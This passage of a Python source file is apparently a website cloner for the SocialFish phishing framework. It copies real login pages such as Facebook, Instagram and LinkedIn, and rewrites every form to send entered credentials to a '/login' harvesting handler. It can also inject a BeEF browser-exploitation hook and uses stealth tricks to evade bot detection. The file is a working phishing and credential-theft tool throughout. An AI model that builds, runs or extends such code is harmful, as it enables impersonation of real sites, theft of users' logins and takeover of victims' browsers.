#!/usr/bin/env python3
"""
SocialFish Compatible UNIVERSAL Website Cloner
Integrates perfectly with existing SocialFish Flask application
Supports ALL modern websites with advanced stealth and universal compatibility
"""

import asyncio
import aiohttp
import aiofiles
import json
import re
import os
import time
import random
import hashlib
import mimetypes
import base64
import zlib
import gzip
import brotli
import logging
import threading
import queue
from pathlib import Path
from dataclasses import dataclass, field
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib.parse
import requests  # Add this import at the top
from functools import wraps
import tempfile
import shutil

# Enhanced imports with fallbacks
try:
    from bs4 import BeautifulSoup, Comment
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False
    print("⚠️ BeautifulSoup not available - using regex fallback")

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.firefox.options import Options as FirefoxOptions
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.common.action_chains import ActionChains
    from selenium.webdriver.common.keys import Keys
    from selenium.common.exceptions import TimeoutException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("⚠️ Selenium not available - using requests only")

try:
    import undetected_chromedriver as uc
    UC_AVAILABLE = True
except ImportError:
    UC_AVAILABLE = False

try:
    from playwright.async_api import async_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# Suppress warnings
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    pass
logging.getLogger('urllib3').setLevel(logging.WARNING)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('socialfish_cloner.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class SocialFishConfig:
    """Configuration optimized for SocialFish integration"""
    def __init__(self):
        # Performance settings
        self.max_workers = 6
        self.max_concurrent_downloads = 12
        self.request_timeout = 30
        self.page_load_timeout = 45
        
        # Stealth settings
        self.rotate_user_agents = True
        self.mimic_human_behavior = True
        self.use_undetected_chrome = UC_AVAILABLE
        
        # Resource handling
        self.download_images = True
        self.download_fonts = True
        self.download_css = True
        self.download_js = True
        self.process_inline_resources = True
        self.rewrite_urls = True
        
        # Advanced features
        self.render_spa = True
        self.handle_auth_flows = True
        self.capture_api_calls = True
        
        # Error handling
        self.max_retries = 3
        self.retry_delay = 1.0
        self.ignore_ssl_errors = True
        
        # SocialFish specific
        self.output_base = 'templates/fake'
        self.create_index_html = True

class AdvancedUserAgentManager:
    """Advanced user agent management with realistic fingerprints"""
    
    def __init__(self):
        self.agents = self._load_comprehensive_agents()
        self.current_index = 0
    
    def _load_comprehensive_agents(self):
        """Load comprehensive user agent database"""
        return [
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'platform': 'Windows',
                'browser': 'Chrome',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"Windows"',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1'
                }
            },
            {
                'ua': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'platform': 'macOS',
                'browser': 'Chrome',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br, zstd',
                    'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Sec-Ch-Ua-Platform': '"macOS"'
                }
            },
            {
                'ua': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0',
                'platform': 'Windows',
                'browser': 'Firefox',
                'mobile': False,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            },
            {
                'ua': 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1',
                'platform': 'iOS',
                'browser': 'Safari',
                'mobile': True,
                'headers': {
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br'
                }
            }
        ]
    
    def get_agent_for_user_agent(self, user_agent_string):
        """Get agent data for specific user agent string"""
        # Find matching agent or use first as fallback
        for agent in self.agents:
            if agent['ua'] == user_agent_string:
                return agent
        
        # Create dynamic entry for custom UA
        return {
            'ua': user_agent_string,
            'platform': 'Unknown',
            'browser': 'Unknown',
            'mobile': 'Mobile' in user_agent_string,
            'headers': {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br'
            }
        }

class SocialFishResourceManager:
    """Resource manager optimized for SocialFish directory structure"""
    
    def __init__(self, config: SocialFishConfig):
        self.config = config
        self.session_pool = []
        self.stats = {
            'downloaded': 0,
            'failed': 0,
            'bytes_downloaded': 0,
            'processing_time': 0
        }
        self.downloaded_urls = set()
        self.failed_urls = set()
    
    async def initialize_sessions(self, user_agent_data):
        """Initialize HTTP sessions"""
        self.session_pool = []
        
        for i in range(3):  # Create 3 sessions
            timeout = aiohttp.ClientTimeout(total=self.config.request_timeout)
            connector = aiohttp.TCPConnector(
                limit=50,
                limit_per_host=10,
                ssl=not self.config.ignore_ssl_errors,
                ttl_dns_cache=300
            )
            
            headers = dict(user_agent_data['headers'])
            headers['User-Agent'] = user_agent_data['ua']
            
            session = aiohttp.ClientSession(
                connector=connector,
                timeout=timeout,
                headers=headers
            )
            
            self.session_pool.append(session)
    
    async def download_resource(self, url: str, resource_type: str, 
                               referer: str = None) -> Optional[Tuple[bytes, Dict[str, Any]]]:
        """Download resource using SYNC requests in async wrapper - BULLETPROOF"""
        if url in self.downloaded_urls or url in self.failed_urls:
            return None
        
        # Run the EXACT working code pattern in a thread
        import concurrent.futures
        import threading
        
        def sync_download():
            """EXACT copy of working code download pattern"""
            try:
                # Create session exactly like working code
                session = requests.Session()
                session.verify = False
                session.timeout = 30
                
                # Headers like working code
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
                    'Accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8' if resource_type == 'image' else '*/*',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Connection': 'keep-alive',
                }
                
                if referer:
                    headers['Referer'] = referer
                
                # EXACT working code request
                response = session.get(url, headers=headers, timeout=30, verify=False)
                
                if response.status_code == 200:
                    # EXACT working code content handling
                    content = response.content  # Raw bytes - this is what works!
                    
                    # EXACT working code decompression
                    encoding = response.headers.get('content-encoding', '').lower()
                    
                    if 'br' in encoding:
                        try:
                            content = brotli.decompress(content)
                        except:
                            pass
                    elif 'gzip' in encoding:
                        try:
                            content = gzip.decompress(content)
                        except:
                            pass
                    elif 'deflate' in encoding:
                        try:
                            content = zlib.decompress(content)
                        except:
                            pass
                    
                    return content, {
                        'url': url,
                        'content_type': response.headers.get('content-type', ''),
                        'size': len(content),
                        'status': response.status_code
                    }
                
                return None
                
            except Exception as e:
                print(f"Download failed: {e}")
                return None
        
        # Run in thread to avoid blocking async loop
        loop = asyncio.get_event_loop()
        with concurrent.futures.ThreadPoolExecutor() as executor:
            future = executor.submit(sync_download)
            try:
                result = await loop.run_in_executor(None, sync_download)
                
                if result:
                    content, metadata = result
                    self.downloaded_urls.add(url)
                    self.stats['downloaded'] += 1
                    self.stats['bytes_downloaded'] += len(content)
                    return content, metadata
                else:
                    self.failed_urls.add(url)
                    self.stats['failed'] += 1
                    return None
                    
            except Exception as e:
                logger.error(f"Thread execution failed: {e}")
                self.failed_urls.add(url)
                self.stats['failed'] += 1
                return None
    
    async def cleanup(self):
        """Cleanup sessions"""
        for session in self.session_pool:
            await session.close()

class SocialFishBrowserManager:
    """Browser manager with advanced stealth for SocialFish"""
    
    def __init__(self, config: SocialFishConfig):
        self.config = config
        self.driver = None
    
    def initialize_browser(self, user_agent: str):
        """Initialize browser with advanced stealth"""
        try:
            if self.config.use_undetected_chrome and UC_AVAILABLE:
                return self._create_undetected_chrome(user_agent)
            elif SELENIUM_AVAILABLE:
                return self._create_selenium_browser(user_agent)
        except Exception as e:
            logger.warning(f"Browser initialization failed: {e}")
        
        return None
    
    def _create_undetected_chrome(self, user_agent: str):
        """Create undetected Chrome instance"""
        try:
            options = uc.ChromeOptions()
            
            stealth_args = [
                '--no-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--window-size=1920,1080',
                f'--user-agent={user_agent}',
                '--disable-blink-features=AutomationControlled',
                '--disable-web-security',
                '--no-first-run'
            ]
            
            for arg in stealth_args:
                options.add_argument(arg)
            
            options.add_experimental_option('excludeSwitches', ['enable-automation'])
            options.add_experimental_option('useAutomationExtension', False)
            
            driver = uc.Chrome(options=options)
            
            # Additional stealth
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            driver.execute_cdp_cmd('Network.setUserAgentOverride', {"userAgent": user_agent})
            
            return driver
            
        except Exception as e:
            logger.error(f"Undetected Chrome creation failed: {e}")
            return None
    
    def _create_selenium_browser(self, user_agent: str):
        """Create regular Selenium browser"""
        try:
            # Try Chrome first
            options = ChromeOptions()
            options.add_argument('--headless')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument(f'--user-agent={user_agent}')
            options.add_argument('--disable-blink-features=AutomationControlled')
            options.add_experimental_option('excludeSwitches', ['enable-automation'])
            
            driver = webdriver.Chrome(options=options)
            driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            return driver
            
        except Exception:
            # Fallback to Firefox
            try:
                options = FirefoxOptions()
                options.add_argument('--headless')
                options.set_preference('general.useragent.override', user_agent)
                options.set_preference('dom.webdriver.enabled', False)
                
                return webdriver.Firefox(options=options)
                
            except Exception as e:
                logger.error(f"Firefox creation failed: {e}")
                return None
    
    async def render_page(self, url: str) -> Optional[str]:
        """Render page with JavaScript execution"""
        if not self.driver:
            return None
        
        try:
            self.driver.set_page_load_timeout(self.config.page_load_timeout)
            self.driver.get(url)
            
            # Wait for page load
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.TAG_NAME, "body"))
            )
            
            # Simulate human behavior
            if self.config.mimic_human_behavior:
                await self._simulate_human_behavior()
            
            # Trigger lazy loading
            self.driver.execute_script("""
                window.scrollTo(0, document.body.scrollHeight);
                
                // Trigger intersection observers
                document.querySelectorAll('img[data-src]').forEach(img => {
                    if (img.dataset.src) {
                        img.src = img.dataset.src;
                    }
                });
                
                // Dispatch load event
                window.dispatchEvent(new Event('load'));
            """)
            
            await asyncio.sleep(2)
            return self.driver.page_source
            
        except Exception as e:
            logger.error(f"Page rendering failed: {e}")
            return None
    
    async def _simulate_human_behavior(self):
        """Simulate human-like behavior"""
        try:
            # Random scrolling
            for position in [0.2, 0.5, 0.8, 1.0]:
                self.driver.execute_script(f"window.scrollTo(0, document.body.scrollHeight * {position});")
                await asyncio.sleep(random.uniform(0.5, 1.0))
        except Exception:
            pass
    
    def cleanup(self):
        """Cleanup browser"""
        if self.driver:
            try:
                self.driver.quit()
            except Exception:
                pass
            self.driver = None

class SocialFishContentProcessor:
    """Content processor optimized for SocialFish"""
    
    def __init__(self, config: SocialFishConfig, resource_manager: SocialFishResourceManager):
        self.config = config
        self.resource_manager = resource_manager
    
    def _is_text_content_type(self, content_type: str, resource_type: str) -> bool:
        """Determine if content should be treated as text"""
        if resource_type in ['css', 'js']:
            return True
        
        if not content_type:
            return resource_type in ['css', 'js']
        
        text_types = [
            'text/', 'application/javascript', 'application/x-javascript',
            'application/json', 'application/xml'
        ]
        
        return any(content_type.lower().startswith(t) for t in text_types)
    
    async def process_html(self, html_content: str, base_url: str, 
                          output_dir: Path, beef_enabled: bool = False) -> str:
        """Process HTML with SocialFish optimizations"""
        
        if not BS4_AVAILABLE:
            return self._process_with_regex(html_content, base_url, output_dir, beef_enabled)
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Remove tracking
        self._remove_tracking_scripts(soup)
        
        # Process resources
        await self._process_all_resources(soup, base_url, output_dir)
        
        # Handle forms for SocialFish
        self._process_forms_for_socialfish(soup)
        
        # Add BeEF hook if enabled
        if beef_enabled:
            self._add_beef_hook(soup)
        
        # Add SocialFish JavaScript
        self._add_socialfish_js(soup)
        
        return str(soup)
    
    def _process_with_regex(self, html_content: str, base_url: str, 
                           output_dir: Path, beef_enabled: bool) -> str:
        """Regex-based processing fallback"""
        logger.info("Using regex fallback for HTML processing")
        
        # Basic form processing
        html_content = re.sub(
            r'(<form[^>]*?)action\s*=\s*["\']([^"\']*)["\']([^>]*>)',
            r'\1action="/login" data-original-action="\2"\3',
            html_content, flags=re.IGNORECASE
        )
        
        # Add BeEF hook if enabled
        if beef_enabled:
            beef_script = '<script src="http://localhost:3000/hook.js"></script>'
            html_content = html_content.replace('</body>', beef_script + '</body>')
        
        return html_content
    
    def _remove_tracking_scripts(self, soup: BeautifulSoup):
        """Remove tracking and analytics scripts"""
        tracking_patterns = [
            r'google-analytics\.com',
            r'googletagmanager\.com',
            r'facebook\.net',
            r'doubleclick\.net',
            r'hotjar\.com'
        ]
        
        for script in soup.find_all(['script', 'iframe']):
            src = script.get('src', '')
            if any(re.search(pattern, src, re.I) for pattern in tracking_patterns):
                script.decompose()
    
    async def _process_all_resources(self, soup: BeautifulSoup, base_url: str, output_dir: Path):
        """Process all resources with parallel downloading"""
        resources = self._discover_resources(soup, base_url)
        
        if not resources:
            return
        
        # Create semaphore for controlled concurrency
        semaphore = asyncio.Semaphore(self.config.max_concurrent_downloads)
        tasks = []
        
        for resource_url, element, attr, resource_type in resources:
            task = self._process_single_resource(
                semaphore, resource_url, element, attr, resource_type, base_url, output_dir
            )
            tasks.append(task)
        
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
    
    def _discover_resources(self, soup: BeautifulSoup, base_url: str) -> List[Tuple[str, Any, str, str]]:
        """Discover all resources in HTML"""
        resources = []
        
        # CSS resources
        for link in soup.find_all('link', rel='stylesheet'):
            href = link.get('href')
            if href and self._is_valid_url(href, base_url):
                resources.append((href, link, 'href', 'css'))
        
        # JavaScript resources
        for script in soup.find_all('script', src=True):
            src = script.get('src')
            if src and self._is_valid_url(src, base_url):
                resources.append((src, script, 'src', 'js'))
        
        # Image resources
        for img in soup.find_all('img', src=True):
            src = img.get('src')
            if src and self._is_valid_url(src, base_url):
                resources.append((src, img, 'src', 'image'))
        
        # Font resources
        for link in soup.find_all('link', href=True):
            href = link.get('href')
            if href and any(ext in href.lower() for ext in ['.woff', '.woff2', '.ttf', '.otf']):
                if self._is_valid_url(href, base_url):
                    resources.append((href, link, 'href', 'font'))
        
        return resources
    
    def _is_valid_url(self, url: str, base_url: str) -> bool:
        """Check if URL should be downloaded"""
        if not url or url.startswith(('data:', 'blob:', 'javascript:')):
            return False
        
        # Skip external CDNs
        skip_domains = ['fonts.googleapis.com', 'cdnjs.cloudflare.com']
        
        try:
            if url.startswith('//'):
                scheme = urllib.parse.urlparse(base_url).scheme
                url = f"{scheme}:{url}"
            elif not url.startswith(('http://', 'https://')):
                return True  # Relative URL
            
            parsed = urllib.parse.urlparse(url)
            return not any(domain in parsed.netloc for domain in skip_domains)
            
        except Exception:
            return False
    
    async def _process_single_resource(self, semaphore: asyncio.Semaphore,
                                     resource_url: str, element: Any, attr: str,
                                     resource_type: str, base_url: str, output_dir: Path):
        """Process a single resource using UNIVERSAL sync download"""
        async with semaphore:
            try:
                # Resolve URL
                if not resource_url.startswith(('http://', 'https://')):
                    if resource_url.startswith('//'):
                        scheme = urllib.parse.urlparse(base_url).scheme
                        resource_url = f"{scheme}:{resource_url}"
                    else:
                        resource_url = urllib.parse.urljoin(base_url, resource_url)
                
                # Use UNIVERSAL synchronous download in thread
                loop = asyncio.get_event_loop()
                
                def sync_download():
                    return self._download_sync_universal(resource_url, output_dir, resource_type, base_url)
                
                # Run in thread
                local_path = await loop.run_in_executor(None, sync_download)
                
                if local_path and element:
                    # Update element with local path
                    element[attr] = local_path
                
            except Exception as e:
                logger.debug(f"Resource processing failed for {resource_url}: {e}")
    
    def _download_sync_universal(self, url, output_dir, resource_type, base_url, referer=None):
        """UNIVERSAL synchronous download - works for any site"""
        try:
            import requests
            
            # Universal session setup
            session = requests.Session()
            session.verify = False
            session.timeout = 30
            
            # UNIVERSAL headers that adapt to target site
            parsed_base = urllib.parse.urlparse(base_url)
            target_domain = parsed_base.netloc
            
            # Dynamic headers based on target site
            headers = {
                'User-Agent': self._get_appropriate_user_agent(target_domain),
                'Accept': self._get_accept_header(resource_type),
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Referer': referer or base_url,  # Dynamic referer
                'Sec-Fetch-Dest': self._get_fetch_dest(resource_type),
                'Sec-Fetch-Mode': 'no-cors',
                'Sec-Fetch-Site': self._get_fetch_site(url, base_url),
            }
            
            # Remove None values
            headers = {k: v for k, v in headers.items() if v is not None}
            
            # Site-specific header adjustments
            headers.update(self._get_site_specific_headers(target_domain, resource_type))
            
            # Follow redirects properly
            response = session.get(url, headers=headers, timeout=30, verify=False, allow_redirects=True)
            
            if response.status_code == 200:
                # Check if we got HTML instead of expected content
                content_type = response.headers.get('content-type', '').lower()
                content = response.content
                
                # Verify we didn't get HTML for binary resources
                if resource_type in ['image', 'font'] and ('html' in content_type or content.startswith(b'<!DOCTYPE') or content.startswith(b'<html')):
                    logger.warning(f"Got HTML instead of {resource_type} for {url}")
                    return None
                
                # Universal decompression
                content = self._universal_decompress(content, response.headers)
                
                # Update stats
                self.resource_manager.stats['downloaded'] += 1
                self.resource_manager.stats['bytes_downloaded'] += len(content)
                
                # Universal save logic
                local_path = self._universal_save(content, url, output_dir, resource_type, response.headers)
                
                if local_path:
                    logger.debug(f"✅ Universal download saved: {local_path} ({len(content)} bytes)")
                    return local_path
            
            return None
            
        except Exception as e:
            logger.error(f"❌ Universal download failed for {url}: {e}")
            self.resource_manager.stats['failed'] += 1
            return None
    
    def _get_appropriate_user_agent(self, domain):
        """Get appropriate user agent for target domain"""
        # Site-specific user agents for better compatibility
        site_agents = {
            'facebook.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'instagram.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'twitter.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'x.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'linkedin.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
            'github.com': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
        }
        
        for site, agent in site_agents.items():
            if site in domain:
                return agent
        
        # Default modern user agent
        return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36'
    
    def _get_accept_header(self, resource_type):
        """Get appropriate Accept header for resource type"""
        accept_headers = {
            'image': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
            'css': 'text/css,*/*;q=0.1',
            'js': 'application/javascript,text/javascript,*/*;q=0.01',
            'font': 'font/woff2,font/woff,*/*;q=0.1',
            'json': 'application/json,*/*;q=0.1',
        }
        return accept_headers.get(resource_type, '*/*')
    
    def _get_fetch_dest(self, resource_type):
        """Get appropriate Sec-Fetch-Dest for resource type"""
        fetch_dest = {
            'image': 'image',
            'css': 'style',
            'js': 'script',
            'font': 'font',
        }
        return fetch_dest.get(resource_type, 'empty')
    
    def _get_fetch_site(self, url, base_url):
        """Determine Sec-Fetch-Site based on URL relationship"""
        try:
            url_domain = urllib.parse.urlparse(url).netloc
            base_domain = urllib.parse.urlparse(base_url).netloc
            
            if url_domain == base_domain:
                return 'same-origin'
            elif url_domain.endswith('.'.join(base_domain.split('.')[-2:])):
                return 'same-site'
            else:
                return 'cross-site'
        except:
            return 'cross-site'
    
    def _get_site_specific_headers(self, domain, resource_type):
        """Get site-specific headers for better compatibility"""
        headers = {}
        
        # Instagram specific
        if 'instagram.com' in domain:
            headers.update({
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
            })
        
        # Facebook specific  
        elif 'facebook.com' in domain:
            headers.update({
                'X-Requested-With': 'XMLHttpRequest',
            })
        
        # Twitter/X specific
        elif any(x in domain for x in ['twitter.com', 'x.com']):
            headers.update({
                'X-Requested-With': 'XMLHttpRequest',
            })
        
        # LinkedIn specific
        elif 'linkedin.com' in domain:
            headers.update({
                'X-Requested-With': 'XMLHttpRequest',
            })
        
        return headers
    
    def _universal_decompress(self, content, headers):
        """Universal decompression that works for any site"""
        if not content:
            return content
            
        encoding = headers.get('content-encoding', '').lower()
        
        try:
            if 'br' in encoding:
                return brotli.decompress(content)
            elif 'gzip' in encoding:
                return gzip.decompress(content)
            elif 'deflate' in encoding:
                return zlib.decompress(content)
        except Exception as e:
            logger.debug(f"Decompression failed, using raw content: {e}")
            # Magic byte detection fallback
            if content[:2] == b'\x1f\x8b':
                try:
                    return gzip.decompress(content)
                except:
                    pass
            elif content[0:1] == b'\x78':
                try:
                    return zlib.decompress(content)
                except:
                    pass
        
        return content
    
    def _universal_save(self, content, url, output_dir, resource_type, headers):
        """Universal save logic that preserves structure for any site"""
        parsed_url = urllib.parse.urlparse(url)
        
        # Always try to preserve original path for images and important resources
        if resource_type in ['image'] and parsed_url.path and parsed_url.path != '/':
            # Keep original path structure
            original_path = parsed_url.path.lstrip('/')
            file_path = output_dir / original_path
            file_path.parent.mkdir(parents=True, exist_ok=True)
            local_path = original_path
        else:
            # Hash-based naming for other resources
            url_hash = hashlib.sha256(url.encode()).hexdigest()[:12]
            extension = self._get_extension(url, headers.get('content-type', ''), resource_type)
            filename = f"resource_{url_hash}{extension}"
            subdir = self._get_subdir(resource_type)
            resource_dir = output_dir / subdir
            resource_dir.mkdir(exist_ok=True)
            file_path = resource_dir / filename
            local_path = f"{subdir}/{filename}"
        
        # Universal binary save (works for all sites)
        with open(file_path, 'wb') as f:
            f.write(content)
        
        return local_path
    
    async def _save_resource(self, content: bytes, metadata: Dict[str, Any],
                           resource_type: str, output_dir: Path) -> Optional[str]:
        """Save resource with SIMPLE binary/text handling - no async file ops for binary"""
        try:
            url = metadata.get('url', '')
            content_type = metadata.get('content_type', '')
            extension = self._get_extension(url, content_type, resource_type)
            parsed_url = urllib.parse.urlparse(url)
            
            # Validate content
            if not content:
                logger.warning(f"Empty content for {url}")
                return None
            
            # Determine save path - preserve structure for images
            if resource_type == 'image' and parsed_url.path and parsed_url.path != '/':
                original_path = parsed_url.path.lstrip('/')
                file_path = output_dir / original_path
                file_path.parent.mkdir(parents=True, exist_ok=True)
                local_path = original_path
            else:
                url_hash = hashlib.sha256(url.encode()).hexdigest()[:12]
                filename = f"resource_{url_hash}{extension}"
                subdir = self._get_subdir(resource_type)
                resource_dir = output_dir / subdir
                resource_dir.mkdir(exist_ok=True)
                file_path = resource_dir / filename
                local_path = f"{subdir}/{filename}"
            
            # SIMPLE FIX: Use regular file operations like the working code
            is_text = self._is_text_content_type(content_type, resource_type)
            
            if is_text:
                # Text content - decode and save
                try:
                    text_content = content.decode('utf-8', errors='ignore')
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(text_content)
                except Exception as e:
                    logger.error(f"Text save failed for {url}: {e}")
                    return None
            else:
                # Binary content - EXACTLY like working code
                with open(file_path, 'wb') as f:
                    f.write(content)  # Direct binary write, no async
            
            # Verify file
            if not file_path.exists() or file_path.stat().st_size == 0:
                logger.error(f"File not written: {file_path}")
                return None
            
            logger.debug(f"Saved {resource_type}: {file_path} ({len(content)} bytes)")
            return local_path
            
        except Exception as e:
            logger.error(f"Save failed for {url}: {e}")
            return None
    
    def _get_extension(self, url: str, content_type: str, resource_type: str) -> str:
        """Get file extension"""
        # Try URL extension
        try:
            parsed = urllib.parse.urlparse(url)
            if parsed.path:
                _, ext = os.path.splitext(parsed.path)
                if ext and len(ext) <= 5:
                    return ext
        except Exception:
            pass
        
        # Use content type
        extensions = {
            'text/css': '.css',
            'application/javascript': '.js',
            'text/javascript': '.js',
            'image/jpeg': '.jpg',
            'image/png': '.png',
            'image/gif': '.gif',
            'image/svg+xml': '.svg',
            'image/webp': '.webp',
            'font/woff2': '.woff2',
            'font/woff': '.woff',
            'application/font-woff': '.woff',
            'application/font-woff2': '.woff2'
        }
        
        return extensions.get(content_type.split(';')[0] if content_type else '', '.bin')
    
    def _get_subdir(self, resource_type: str) -> str:
        """Get subdirectory for resource type"""
        subdirs = {
            'css': 'css',
            'js': 'js', 
            'image': 'images',
            'font': 'fonts',
            'asset': 'assets'
        }
        return subdirs.get(resource_type, 'assets')
    
    def _process_forms_for_socialfish(self, soup: BeautifulSoup):
        """Process forms for SocialFish integration"""
        for form in soup.find_all('form'):
            # Store original action
            original_action = form.get('action', '')
            if original_action:
                form['data-original-action'] = original_action
            
            # Redirect to SocialFish login handler
            form['action'] = '/login'
            form['method'] = 'post'
    
    def _add_beef_hook(self, soup: BeautifulSoup):
        """Add BeEF hook for penetration testing"""
        script = soup.new_tag('script')
        script['src'] = 'http://localhost:3000/hook.js'
        
        body = soup.find('body')
        if body:
            body.append(script)
    
    def _add_socialfish_js(self, soup: BeautifulSoup):
        """Add SocialFish-specific JavaScript"""
        script = soup.new_tag('script')
        script.string = '''
        (function() {
            // SocialFish form override
            document.addEventListener('DOMContentLoaded', function() {
                document.querySelectorAll('form').forEach(function(form) {
                    form.addEventListener('submit', function(e) {
                        // Let SocialFish handle the form submission
                        this.action = '/login';
                        this.method = 'post';
                    });
                });
            });
        })();
        '''
        
        head = soup.find('head')
        if head:
            head.insert(0, script)

class SocialFishCloner:
    """Main cloner class for SocialFish integration"""
    
    def __init__(self, config: SocialFishConfig = None):
        self.config = config or SocialFishConfig()
        self.user_agent_manager = AdvancedUserAgentManager()
        self.resource_manager = SocialFishResourceManager(self.config)
        self.content_processor = SocialFishContentProcessor(self.config, self.resource_manager)
        self.browser_manager = SocialFishBrowserManager(self.config)
    
    async def clone_website_async(self, url: str, user_agent: str, beef_enabled: bool = False) -> bool:
        """Async clone website for SocialFish"""
        start_time = time.time()
        
        try:
            logger.info(f"🚀 Starting SocialFish clone: {url}")
            
            # Setup output directory (SocialFish structure)
            output_dir = self._create_output_directory(url, user_agent)
            if not output_dir:
                return False
            
            # Get user agent data
            user_agent_data = self.user_agent_manager.get_agent_for_user_agent(user_agent)
            
            # Initialize components
            await self.resource_manager.initialize_sessions(user_agent_data)
            self.browser_manager.driver = self.browser_manager.initialize_browser(user_agent)
            
            # Get page content
            html_content = await self._get_page_content(url)
            if not html_content:
                logger.error("❌ Failed to retrieve page content")
                return False
            
            logger.info(f"✅ Retrieved content: {len(html_content)} characters")
            
            # Process content
            processed_html = await self.content_processor.process_html(
                html_content, url, output_dir, beef_enabled
            )
            
            # Save main HTML file
            index_path = output_dir / 'index.html'
            async with aiofiles.open(index_path, 'w', encoding='utf-8') as f:
                await f.write(processed_html)
            
            # Save metadata
            await self._save_metadata(url, output_dir, start_time)
            
            duration = time.time() - start_time
            logger.info(f"🎉 SocialFish clone completed in {duration:.2f}s")
            logger.info(f"📊 Stats: {self.resource_manager.stats}")
            
            return True
            
        except Exception as e:
            logger.error(f"❌ Cloning failed: {e}")
            return False
        
        finally:
            await self._cleanup()
    
    def _create_output_directory(self, url: str, user_agent: str) -> Optional[Path]:
        """Create output directory in SocialFish structure"""
        try:
            # Clean user agent for directory name
            safe_agent = re.sub(r'[^\w\-_.]', '_', user_agent)
            
            # Extract domain from URL
            parsed_url = urllib.parse.urlparse(url)
            domain = parsed_url.netloc
